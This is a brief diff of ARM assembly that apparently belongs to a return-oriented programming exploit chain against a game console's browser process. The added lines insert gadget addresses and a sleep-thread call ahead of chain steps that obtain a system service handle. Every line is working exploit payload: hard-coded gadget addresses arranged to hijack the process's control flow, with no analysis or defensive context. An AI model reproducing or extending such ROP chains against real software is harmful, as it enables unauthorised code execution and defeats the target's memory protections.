@@ -9,6 +9,12 @@ thread0rop:
 	.word 0xDEADC0DE
 	;actual ROP start
 
+	.word 0x002954e8 ; pop {r0, pc}
+		.word 0xFFFFFFFF
+	.word 0x0023d10c ; pop {r1, pc}
+		.word 0x00FFFFFF
+	.word 0x002D6A5C ; svcSleepThread
+
 	;grab ldr:ro handle
 		.word 0x0010c2fc ; pop {r0, pc}
 			.word SPIDER_ROHANDLE_ADR ; r0 (dst)
